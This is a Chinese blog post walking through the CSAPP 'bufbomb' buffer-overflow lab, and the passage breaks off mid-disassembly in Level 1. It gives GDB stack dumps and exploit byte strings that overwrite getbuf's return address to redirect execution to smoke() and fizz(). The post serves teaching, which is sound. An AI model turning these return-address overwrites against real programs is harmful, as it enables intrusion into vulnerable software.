{"data":{"title":"CSAPP LAB-3 缓冲区溢出炸弹","slug":"CSAPP LABS/CSAPP LAB-3 缓冲区溢出炸弹","description":"缓冲区溢出攻击实验","date":"2024-05-26T07:38:09.000Z","updated":"2025-01-23T15:54:02.257Z","language":"zh-CN","comments":true,"url":"p/67787353/","cover":"https://cdn.gallery.uuanqin.top/img/202501232353097.webp","images":[],"content":"<p>我发现我做的实验 3 和网上的都不太一样，难道这实验有新老版本之分？不过主题都是一致的：利用缓冲区溢出的漏洞进行攻击。</p>\n\n<div class=\"callout\" data-callout=\"notice\">\n<div class=\"callout-title\">\n<div class=\"callout-title-icon\">\n<svg xmlns=\"http://www.w3.org/2000/svg\" width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"none\" stroke=\"currentColor\" stroke-width=\"2\" stroke-linecap=\"round\" stroke-linejoin=\"round\" class=\"lucide lucide-pencil\"><path d=\"M17 3a2.85 2.83 0 1 1 4 4L7.5 20.5 2 22l1.5-5.5Z\"/><path d=\"m15 5 4 4\"/></svg>\n</div>\n<div class=\"callout-title-inner\">CSAPP LAB 实验</div>\n</div>\n<div class=\"callout-content\"><p></p>\n<ul>\n<li><a class=\"uuanqin-bilink\" target=\"_blank\" href=\"/p/c5970284/\"><span class=\"yukari\">站内文章</span>CSAPP LAB-1 位操作</a></li>\n<li><a class=\"uuanqin-bilink\" target=\"_blank\" href=\"/p/d1f3cf37/\"><span class=\"yukari\">站内文章</span>CSAPP LAB-2 二进制炸弹实验</a></li>\n<li>CSAPP LAB-3 缓冲区溢出炸弹（本文）</li>\n<li><a class=\"uuanqin-bilink\" target=\"_blank\" href=\"/p/9d6b717/\"><span class=\"yukari\">站内文章</span>CSAPP LAB-4 代码优化</a></li>\n<li><a class=\"uuanqin-bilink\" target=\"_blank\" href=\"/p/3eb1abc7/\"><span class=\"yukari\">站内文章</span>CSAPP LAB-5 手写动态存储分配器</a></li>\n</ul>\n</div></div><p>如果你曾经做过 Lab2，那么阅读汇编代码将会很轻松。</p>\n<h1 id=\"实验简介\"><a class=\"markdownIt-Anchor\" href=\"#实验简介\"></a> 实验简介</h1>\n<p>名称：缓冲区溢出炸弹</p>\n<p>实验代码：</p>\n<ul>\n<li><code>makecookie</code>：生成 cookie，后续实验用到，以判断实验是否成功。例：<code>./makecookie SA18225155</code> 生成 cookie</li>\n<li><code>bufbomb</code>：可执行程序 - 攻击对象</li>\n<li><code>sendstring</code>: 字符格式转换</li>\n</ul>\n<h2 id=\"bufbomb-程序\"><a class=\"markdownIt-Anchor\" href=\"#bufbomb-程序\"></a> bufbomb 程序</h2>\n<p><code>bufbomb</code> 中包含一个 <code>getbuf</code> 函数，该函数实现如下：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">int</span> <span class=\"title function_\">getbuf</span><span class=\"params\">()</span> </span><br><span class=\"line\">&#123; </span><br><span class=\"line\"> \t<span class=\"type\">char</span> buf[<span class=\"number\">12</span>]; </span><br><span class=\"line\">\tGets(buf); </span><br><span class=\"line\">\t<span class=\"keyword\">return</span> <span class=\"number\">1</span>; </span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>可以发现，这个函数对 buf 没有越界检查（这是常见的 c 编程错误），当输入超过 11 个字符将溢出。溢出的字符将覆盖栈帧上的数据，特别的，会覆盖程序调用的返回地址。这赋予我们控制程序流程的能力，我们可以通过构造溢出字符串，程序将“返回”至我们想要的代码上。</p>\n<p>执行以下命令进行反汇编：</p>\n<figure class=\"highlight sh\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">objdump -d bufbomb &gt; bufbomb.s</span><br></pre></td></tr></table></figure>\n<p>观察汇编代码，结合栈帧结构进行理解：</p>\n<figure class=\"highlight d\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0</span>8048fe0 &lt;getbuf&gt;:</span><br><span class=\"line\"> <span class=\"number\">8048</span>fe0:\t<span class=\"number\">55</span>                   \tpush   %ebp         </span><br><span class=\"line\"> <span class=\"number\">8048</span>fe1:\t<span class=\"number\">89</span> e5                \tmov    %esp,%ebp</span><br><span class=\"line\"> <span class=\"number\">8048</span>fe3:\t<span class=\"number\">83</span> ec <span class=\"number\">18</span>             \tsub    $<span class=\"number\">0</span>x18,%esp       # 缓冲区分配</span><br><span class=\"line\"> <span class=\"number\">8048</span>fe6:\t<span class=\"number\">8</span>d <span class=\"number\">45</span> f4             \tlea    -<span class=\"number\">0</span>xc(%ebp),%eax  # 请注意这一行</span><br><span class=\"line\"> <span class=\"number\">8048</span>fe9:\t<span class=\"number\">89</span> <span class=\"number\">0</span>4 <span class=\"number\">24</span>             \tmov    %eax,(%esp)</span><br><span class=\"line\"> <span class=\"number\">8048</span>fec:\te8 <span class=\"number\">6</span>f fe ff ff       \tcall   <span class=\"number\">8048e60</span> &lt;Gets&gt;</span><br><span class=\"line\"> <span class=\"number\">8048</span>ff1:\tb8 <span class=\"number\">0</span>1 <span class=\"number\">0</span>0 <span class=\"number\">0</span>0 <span class=\"number\">0</span>0       \tmov    $<span class=\"number\">0</span>x1,%eax</span><br><span class=\"line\"> <span class=\"number\">8048</span>ff6:\tc9                   \tleave  </span><br><span class=\"line\"> <span class=\"number\">8048</span>ff7:\tc3                   \tret    </span><br><span class=\"line\"> <span class=\"number\">8048</span>ff8:\t<span class=\"number\">90</span>                   \tnop</span><br><span class=\"line\"> <span class=\"number\">8048</span>ff9:\t<span class=\"number\">8</span>d b4 <span class=\"number\">26</span> <span class=\"number\">0</span>0 <span class=\"number\">0</span>0 <span class=\"number\">0</span>0 <span class=\"number\">0</span>0 \tlea    <span class=\"number\">0</span>x0(%esi,%eiz,<span class=\"number\">1</span>),%esi</span><br></pre></td></tr></table></figure>\n<p><img src= \"/image/loading.gif\" data-lazy-src=\"https://cdn.gallery.uuanqin.top/img/20240526154709.webp\" alt=\"image.png\" width=\"300px\" /></p>\n<h2 id=\"sendstring-字符串转换程序\"><a class=\"markdownIt-Anchor\" href=\"#sendstring-字符串转换程序\"></a> sendstring 字符串转换程序</h2>\n<p>它的功能是将 16 进制的数据转换为 ASCII 字符串。比如：<code>41 42 43</code> 转换为 <code>ABC</code>。</p>\n<p>因为 <code>bufbomb</code> 接收的参数是 ASCII 字符串，我们输入的字符串使用了扩展的 ASCII 码（128~255）难以直接输入。</p>\n<p>所以实验的基本流程为：</p>\n<ul>\n<li>在一个文件，如 <code>exploit.txt</code> 写好十六进制数据</li>\n<li>执行命令得到字符文件：<code>./sendstring &lt; exploit.txt &gt; exploit-raw.txt </code></li>\n<li>运行 bufbomb 程序：<code>bufbomb -t &lt;your_number&gt; &lt; exploit-raw.txt</code>。<code>&lt;your_number&gt;</code> 填写你的学号以验证 cookie。</li>\n</ul>\n<p>当然，我们也可以通过手动输入（从标准输入设备输入）的方式：<kbd>ALT</kbd>+ASC 码的十进制数（小键盘输入）。注意，最后一个数字按下后与 ALT 键同时放开。例如输入字符“1”为 ALT+49</p>\n<blockquote>\n<p>我感觉我们的实验时阉割版，不启用评分系统。和 Lab2 不一样的是，bufbomb 是运行 1 次解开对应 Level。如果有 4 个 Level 我们可能需要写 4 个 exploit.txt。但不管怎样，基本思路是一致的。</p>\n</blockquote>\n<h2 id=\"gdb\"><a class=\"markdownIt-Anchor\" href=\"#gdb\"></a> GDB</h2>\n<p>GDB 的使用详见：<a class=\"uuanqin-bilink\" target=\"_blank\" href=\"/p/d1f3cf37/\"><span class=\"yukari\">站内文章</span>CSAPP LAB-2 二进制炸弹实验</a>。这里新学一个命令：<code>examine</code> 查看内存地址中的值（简写为 <code>x</code>）。<code>x</code> 命令的语法如下所示：</p>\n<p><code>x/&lt;n/f/u&gt; &lt;addr&gt;</code></p>\n<p><code>n</code>、<code>f</code>、<code>u</code> 是可选的参数：</p>\n<ul>\n<li><code>n</code> 是一个正整数，表示显示内存的长度，也就是说从当前地址向后显示几个地址的内容。</li>\n<li><code>f</code> 表示显示的格式，参见上面。如果地址所指的是字符串，那么格式可以是 <code>s</code>，如果 地址是指令地址，那么格式可以是 i。</li>\n<li><code>u</code> 表示从当前地址往后请求的字节数，如果不指定的话，GDB 默认是 4 个 bytes。<code>u</code> 参数可以用下面的字符来代替：<code>b</code> 表示单字节，<code>h</code> 表示双字节，<code>w</code> 表示四字 节，<code>g</code> 表示八字节。当我们指定了字节长度后，GDB 会从指内存定的内存地址开始，读写指定字节，并把其当作一个值取出来。</li>\n</ul>\n<p>例子：</p>\n<figure class=\"highlight d\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">(gdb) x/<span class=\"number\">48</span>xb $ebp</span><br><span class=\"line\"><span class=\"number\">0</span>xffffba40:     <span class=\"number\">0</span>x4c    <span class=\"number\">0</span>xba    <span class=\"number\">0</span>xff    <span class=\"number\">0</span>xff    <span class=\"number\">0</span>x74    <span class=\"number\">0</span>x2b    <span class=\"number\">0</span>xdf    <span class=\"number\">0</span>xf7</span><br><span class=\"line\"><span class=\"number\">0</span>xffffba48:     <span class=\"number\">0</span>x0b    <span class=\"number\">0</span>x38    <span class=\"number\">0</span>xe3    <span class=\"number\">0</span>xf7    <span class=\"number\">0</span>x41    <span class=\"number\">0</span>x42    <span class=\"number\">0</span>x43    <span class=\"number\">0</span>x44</span><br><span class=\"line\"><span class=\"number\">0</span>xffffba50:     <span class=\"number\">0</span>x45    <span class=\"number\">0</span>x46    <span class=\"number\">0</span>x47    <span class=\"number\">0</span>x48    <span class=\"number\">0</span>x49    <span class=\"number\">0</span>x4a    <span class=\"number\">0</span>x4b    <span class=\"number\">0</span>x00</span><br><span class=\"line\"><span class=\"number\">0</span>xffffba58:     <span class=\"number\">0</span>x78    <span class=\"number\">0</span>xba    <span class=\"number\">0</span>xff    <span class=\"number\">0</span>xff    <span class=\"number\">0</span>x1e    <span class=\"number\">0</span>x90    <span class=\"number\">0</span>x04    <span class=\"number\">0</span>x08</span><br><span class=\"line\"><span class=\"number\">0</span>xffffba60:     <span class=\"number\">0</span>x03    <span class=\"number\">0</span>x00    <span class=\"number\">0</span>x00    <span class=\"number\">0</span>x00    <span class=\"number\">0</span>xc7    <span class=\"number\">0</span>x9a    <span class=\"number\">0</span>x04    <span class=\"number\">0</span>x08</span><br><span class=\"line\"><span class=\"number\">0</span>xffffba68:     <span class=\"number\">0</span>x84    <span class=\"number\">0</span>xba    <span class=\"number\">0</span>xff    <span class=\"number\">0</span>xff    <span class=\"number\">0</span>x60    <span class=\"number\">0</span>x90    <span class=\"number\">0</span>xf2    <span class=\"number\">0</span>xf7</span><br></pre></td></tr></table></figure>\n<h2 id=\"一些汇编指令参考\"><a class=\"markdownIt-Anchor\" href=\"#一些汇编指令参考\"></a> 一些汇编指令参考</h2>\n<p>不一定全都用到：</p>\n<ul>\n<li><code>call 地址</code>：返回地址入栈（等价于 <code>push %eip；mov 地址，%eip</code>；注意 <code>eip</code> 指向下一条尚未执行的指令）</li>\n<li><code>ret</code>：从栈中弹出地址，并跳到那个地址（pop %eip）</li>\n<li><code>leave</code>：使栈做好返回准备，等价于 <code>mov %ebp, %esp; pop %ebp</code></li>\n<li><code>push</code>：<code>R[%esp]&lt;--R[%esp]-4;  M[R[%esp]]&lt;--S</code></li>\n<li><code>pop</code>:  <code>D&lt;--M[R[%esp]];   R[%esp]&lt;--R[%esp]+4;</code></li>\n</ul>\n<h1 id=\"实验开始\"><a class=\"markdownIt-Anchor\" href=\"#实验开始\"></a> 实验开始</h1>\n<h2 id=\"level-0-蜡烛\"><a class=\"markdownIt-Anchor\" href=\"#level-0-蜡烛\"></a> Level 0 - 蜡烛</h2>\n<blockquote>\n<p>本层考察地址跳转。</p>\n</blockquote>\n<p>炸弹的主体函数 <code>test</code> 为：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">test</span><span class=\"params\">()</span> </span><br><span class=\"line\">&#123; </span><br><span class=\"line\">\t<span class=\"type\">int</span> val; </span><br><span class=\"line\">\t<span class=\"keyword\">volatile</span> <span class=\"type\">int</span> local = <span class=\"number\">0xdeadbeef</span>; </span><br><span class=\"line\">\tentry_check(<span class=\"number\">3</span>); <span class=\"comment\">/* Make sure entered this function properly */</span> </span><br><span class=\"line\">\tval = getbuf(); <span class=\"comment\">// getbuf函数在test中被调用，当getbuf返回时继续执行后续内容</span></span><br><span class=\"line\">\t<span class=\"comment\">/* Check for corrupted stack */</span> </span><br><span class=\"line\">\t<span class=\"keyword\">if</span> (local != <span class=\"number\">0xdeadbeef</span>) &#123; </span><br><span class=\"line\">\t\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Sabotaged!: the stack has been corrupted\\n&quot;</span>); </span><br><span class=\"line\">\t&#125; </span><br><span class=\"line\">\t<span class=\"keyword\">else</span> <span class=\"keyword\">if</span> (val == cookie) &#123; </span><br><span class=\"line\">\t\t...\t</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>正常运行的结果为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Type string: &lt;随便输入小于11个字符的字符串&gt;</span><br><span class=\"line\">Better luck next time</span><br></pre></td></tr></table></figure>\n<p><code>smoke</code> 是 <code>bufbomb</code> 中一个正常情况下不会被执行的函数：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">smoke</span><span class=\"params\">()</span> </span><br><span class=\"line\">&#123; </span><br><span class=\"line\">\tentry_check(<span class=\"number\">0</span>); <span class=\"comment\">/* Make sure entered this function properly */</span> </span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Smoke!: You called smoke()\\n&quot;</span>); </span><br><span class=\"line\">\tvalidate(<span class=\"number\">0</span>); </span><br><span class=\"line\">\t<span class=\"built_in\">exit</span>(<span class=\"number\">0</span>); </span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<p>我们的目标：在 <code>getbuf</code> 返回时跳到 <code>smoke</code> 函数执行。</p>\n<p>思路：</p>\n<ul>\n<li>通过调试得到我们输入的字符串首地址，并打印出该字符串作验证 <code>x/s $ebp-0xc</code></li>\n<li>找到函数 <code>smoke</code> 的地址 <code>p/x &amp;smoke</code>；或者直接在反编译文件中搜索 <code>smoke</code> 函数地址即可。</li>\n<li>用 <code>smoke</code> 函数的地址覆盖 <code>getbuf</code> 的返回地址。</li>\n</ul>\n<p>我们先简单测试一个不会造成缓冲区溢出的正常字符串：<code>41 42 43 44 45 46 47 48 49 4a 4b</code> 11 个字符加上末尾 <code>\\0</code>。</p>\n<p>GDB 调试，在 getbuf 函数返回前，检查%esp：</p>\n<figure class=\"highlight d\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">; (gdb) p /x $esp</span><br><span class=\"line\">; $<span class=\"number\">2</span> = <span class=\"number\">0</span>xffffba40  ⏩</span><br><span class=\"line\"></span><br><span class=\"line\">(gdb) p /x $ebp</span><br><span class=\"line\">$<span class=\"number\">9</span> = <span class=\"number\">0</span>xffffba58  ▶ </span><br><span class=\"line\"></span><br><span class=\"line\">; (gdb) x/<span class=\"number\">48</span>xb $esp</span><br><span class=\"line\">; <span class=\"number\">0</span>xffffba40:⏩  <span class=\"number\">0</span>x4c    <span class=\"number\">0</span>xba    <span class=\"number\">0</span>xff    <span class=\"number\">0</span>xff    <span class=\"number\">0</span>x74    <span class=\"number\">0</span>x2b    <span class=\"number\">0</span>xdf    <span class=\"number\">0</span>xf7</span><br><span class=\"line\">; <span class=\"number\">0</span>xffffba48:     <span class=\"number\">0</span>x0b    <span class=\"number\">0</span>x38    <span class=\"number\">0</span>xe3    <span class=\"number\">0</span>xf7    😀<span class=\"number\">0</span>x41    <span class=\"number\">0</span>x42    <span class=\"number\">0</span>x43    <span class=\"number\">0</span>x44</span><br><span class=\"line\">; <span class=\"number\">0</span>xffffba50:     <span class=\"number\">0</span>x45    <span class=\"number\">0</span>x46    <span class=\"number\">0</span>x47    <span class=\"number\">0</span>x48    <span class=\"number\">0</span>x49    <span class=\"number\">0</span>x4a    <span class=\"number\">0</span>x4b    <span class=\"number\">0</span>x00😉</span><br><span class=\"line\">; <span class=\"number\">0</span>xffffba58:▶  <span class=\"number\">0</span>x78    <span class=\"number\">0</span>xba    <span class=\"number\">0</span>xff    <span class=\"number\">0</span>xff    ❤<span class=\"number\">0</span>x1e    <span class=\"number\">0</span>x90    <span class=\"number\">0</span>x04    <span class=\"number\">0</span>x08❤ </span><br><span class=\"line\">; <span class=\"number\">0</span>xffffba60:     <span class=\"number\">0</span>x03    <span class=\"number\">0</span>x00    <span class=\"number\">0</span>x00    <span class=\"number\">0</span>x00    <span class=\"number\">0</span>xc7    <span class=\"number\">0</span>x9a    <span class=\"number\">0</span>x04    <span class=\"number\">0</span>x08</span><br><span class=\"line\">; <span class=\"number\">0</span>xffffba68:     <span class=\"number\">0</span>x84    <span class=\"number\">0</span>xba    <span class=\"number\">0</span>xff    <span class=\"number\">0</span>xff    <span class=\"number\">0</span>x60    <span class=\"number\">0</span>x90    <span class=\"number\">0</span>xf2    <span class=\"number\">0</span>xf7</span><br></pre></td></tr></table></figure>\n<p>😀标记处，也就是汇编代码中的 <code>-0xc(%ebp)</code> 就是缓冲区开始地址。😉标记缓冲区结束的位置。</p>\n<p>❤标记的 <code>0x1e    0x90    0x04    0x08</code> 是地址 <code>0x0804901e</code> 小端编码后的结果，指向返回 test 地址（因为 test 调用 getbuf）。</p>\n<p>那我们利用缓冲区溢出取覆盖掉这个地址就行，让他指向 smoke 函数。观察反汇编的代码 <code>bufbomb.s</code> 容易知道 smoke 函数地址为：<code>0x08048e20</code>，小端写法：<code>20 8e 04 08</code>。所以，<code>exploit0.txt</code> 为：</p>\n<figure class=\"highlight txt\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">41 42 43 44 45 46 47 48 49 4a 4b 4c ff ff ff ff 20 8e 04 08</span><br></pre></td></tr></table></figure>\n<p>gdb 重新运行 bufbomb 我们可以观察注入后的栈帧：</p>\n<figure class=\"highlight d\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">; 注入后：</span><br><span class=\"line\">; (gdb) x/<span class=\"number\">48</span>xb $esp</span><br><span class=\"line\">; <span class=\"number\">0</span>xffffba40:⏩  <span class=\"number\">0</span>x4c    <span class=\"number\">0</span>xba    <span class=\"number\">0</span>xff    <span class=\"number\">0</span>xff    <span class=\"number\">0</span>x74    <span class=\"number\">0</span>x2b    <span class=\"number\">0</span>xdf    <span class=\"number\">0</span>xf7</span><br><span class=\"line\">; <span class=\"number\">0</span>xffffba48:     <span class=\"number\">0</span>x0b    <span class=\"number\">0</span>x38    <span class=\"number\">0</span>xe3    <span class=\"number\">0</span>xf7    😀<span class=\"number\">0</span>x41    <span class=\"number\">0</span>x42    <span class=\"number\">0</span>x43    <span class=\"number\">0</span>x44</span><br><span class=\"line\">; <span class=\"number\">0</span>xffffba50:     <span class=\"number\">0</span>x45    <span class=\"number\">0</span>x46    <span class=\"number\">0</span>x47    <span class=\"number\">0</span>x48    <span class=\"number\">0</span>x49    <span class=\"number\">0</span>x4a    <span class=\"number\">0</span>x4b    <span class=\"number\">0</span>x4c</span><br><span class=\"line\">; <span class=\"number\">0</span>xffffba58:▶  <span class=\"number\">0</span>xff    <span class=\"number\">0</span>xff    <span class=\"number\">0</span>xff    <span class=\"number\">0</span>xff    ❤<span class=\"number\">0</span>x20    <span class=\"number\">0</span>x8e    <span class=\"number\">0</span>x04    <span class=\"number\">0</span>x08❤</span><br><span class=\"line\">; <span class=\"number\">0</span>xffffba60:     <span class=\"number\">0</span>x00    <span class=\"number\">0</span>x00    <span class=\"number\">0</span>x00    <span class=\"number\">0</span>x00    <span class=\"number\">0</span>xc7    <span class=\"number\">0</span>x9a    <span class=\"number\">0</span>x04    <span class=\"number\">0</span>x08</span><br><span class=\"line\">; <span class=\"number\">0</span>xffffba68:     <span class=\"number\">0</span>x84    <span class=\"number\">0</span>xba    <span class=\"number\">0</span>xff    <span class=\"number\">0</span>xff    <span class=\"number\">0</span>x60    <span class=\"number\">0</span>x90    <span class=\"number\">0</span>xf2    <span class=\"number\">0</span>xf7</span><br></pre></td></tr></table></figure>\n<p>运行结果如下：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">Type string:Smoke!: You called smoke()</span><br></pre></td></tr></table></figure>\n<h2 id=\"level-1-烟火\"><a class=\"markdownIt-Anchor\" href=\"#level-1-烟火\"></a> Level 1 - 烟火</h2>\n<blockquote>\n<p>本层考察函数传参。</p>\n</blockquote>\n<p>bufbomb 存在另一个函数 fizz：</p>\n<figure class=\"highlight c\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"type\">void</span> <span class=\"title function_\">fizz</span><span class=\"params\">(<span class=\"type\">int</span> val)</span> </span><br><span class=\"line\">&#123; </span><br><span class=\"line\">\tentry_check(<span class=\"number\">1</span>); <span class=\"comment\">/* Make sure entered this function properly */</span> </span><br><span class=\"line\"><span class=\"keyword\">if</span> (val == cookie) &#123; </span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Fizz!: You called fizz(0x%x)\\n&quot;</span>, val);  <span class=\"comment\">// 我们必须运行到这里</span></span><br><span class=\"line\">\tvalidate(<span class=\"number\">1</span>); </span><br><span class=\"line\">&#125; <span class=\"keyword\">else</span> </span><br><span class=\"line\">\t<span class=\"built_in\">printf</span>(<span class=\"string\">&quot;Misfire: You called fizz(0x%x)\\n&quot;</span>, val); </span><br><span class=\"line\">\t<span class=\"built_in\">exit</span>(<span class=\"number\">0</span>); </span><br><span class=\"line\">&#125; </span><br></pre></td></tr></table></figure>\n<p>目标：“返回”到该函数并传送参数 cookie。Cookie 为上文提到的 <code>makecookie</code> 程序结合自己学号生成 <code>./makecookie SA08225155</code>。</p>\n<p>fizz  的地址为  <code>0x08048dc0</code>，小端写法：<code>c0 8d 04 08</code>。所以参照 Level 0，得到 exploit 的基本写法为：</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">41 42 43 44 45 46 47 48 49 4a 4b 4c ff ff ff ff c0 8d 04 08</span><br></pre></td></tr></table></figure>\n<p>继续阅读反汇编代码：</p>\n<figure class=\"highlight d\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"number\">0</span>8048dc0 &lt;fizz&gt;:</span><br><span class=\"line\"> <span class=\"number\">8048</span>dc0:\t<span class=\"number\">55</span>                   \tpush   %ebp</span><br><span class=\"line\"> <span class=\"number\">8048</span>dc1:\t<span class=\"number\">89</span> e5                \tmov    %esp,%ebp</span><br><span class=\"line\"> <span class=\"number\">8048</span>dc3:\t<span class=\"number\">53</span>                   \tpush   %ebx</span><br><span class=\"line\"> <span class=\"number\">8048</span>dc4:\t<span class=\"number\">83</span> ec <span class=\"number\">14</span>             \tsub    $<span class=\"number\">0</span>x14,%esp</span><br><span class=\"line\"> <span class=\"number\">8048</span>dc7:\t<span class=\"number\">8</span>b <span class=\"number\">5</span>d <span class=\"number\">0</span>8             \tmov    <span class=\"number\">0</span>x8(%ebp),%ebx      #  不要看错为-<span class=\"number\">0</span>x8(%ebp)</span><br><span class=\"line\"> # <span class=\"number\">0</span>x8(%ebp)  <span class=\"number\">0</span>x8049ac7 -&gt; </span><br><span class=\"line\">;  (gdb) p (<span class=\"built_in\">char</span>*) <span class=\"number\">0</span>x8049ac7</span><br><span class=\"line\">; $<span class=\"number\">99</span> = <span class=\"number\">0</span>x8049ac7 <span class=\"string\">&quot;Type string:&quot;</span></span><br><span class=\"line\"> <span class=\"number\">8048</span>dca:\tc7 <span class=\"number\">0</span>4 <span class=\"number\">24</span> <span class=\"number\">0</span>1 <span class=\"number\">0</span>0 <span class=\"number\">0</span>0 <span class=\"number\">0</span>0 \tmovl   $<span class=\"number\">0</span>x1,(%esp)</span><br><span class=\"line\"> <span class=\"number\">8048</span>dd1:\te8 ca fb ff ff       \tcall   <span class=\"number\">80489</span>a0 &lt;entry_check&gt;</span><br><span class=\"line\"> <span class=\"number\">8048</span>dd6:\t<span class=\"number\">3</span>b <span class=\"number\">1</span>d cc a1 <span class=\"number\">0</span>4 <span class=\"number\">0</span>8    \tcmp    <span class=\"number\">0</span>x804a1cc,%ebx      #  <span class=\"number\">0</span>x804a1cc 存储的是cookie字符串 <span class=\"number\">0</span>x2ac98515 对应我的学号</span><br><span class=\"line\"> <span class=\"number\">8048</span>ddc:\t<span class=\"number\">74</span> <span class=\"number\">22</span>                \tje     <span class=\"number\">8048e0</span>0 &lt;fizz+<span class=\"number\">0</span>x40&gt;  # 要想成功，必须相等</span><br><span class=\"line\"> <span class=\"number\">8048</span>dde:\t<span class=\"number\">89</span> <span class=\"number\">5</span>c <span class=\"number\">24</span> <span class=\"number\">0</span>4          \tmov    %ebx,<span class=\"number\">0</span>x4(%esp)</span><br><span class=\"line\"> <span class=\"number\">8048</span>de2:\tc7 <span class=\"number\">0</span>4 <span class=\"number\">24</span> <span class=\"number\">98</span> <span class=\"number\">98</span> <span class=\"number\">0</span>4 <span class=\"number\">0</span>8 \tmovl   $<span class=\"number\">0</span>x8049898,(%esp)    # 传入字符串：<span class=\"string\">&quot;Misfire: You called fizz(0x%x)\\n&quot;</span></span><br><span class=\"line\">;  (gdb) p (<span class=\"built_in\">char</span>*) <span class=\"number\">0</span>x8049898</span><br><span class=\"line\">; $<span class=\"number\">53</span> = <span class=\"number\">0</span>x8049898 <span class=\"string\">&quot;Misfire: You called fizz(0x%x)\\n&quot;</span>  </span><br><span class=\"line\"> <span class=\"number\">8048</span>de9:\te8 <span class=\"number\">76</span> f9 ff ff       \tcall   <span class=\"number\">8048764</span> &lt;printf<span class=\"keyword\">@plt</span>&gt;</span><br><span class=\"line\"></span><br><span class=\"line\"> <span class=\"number\">8048</span>dee:\tc7 <span class=\"number\">0</span>4 <span class=\"number\">24</span> <span class=\"number\">0</span>0 <span class=\"number\">0</span>0 <span 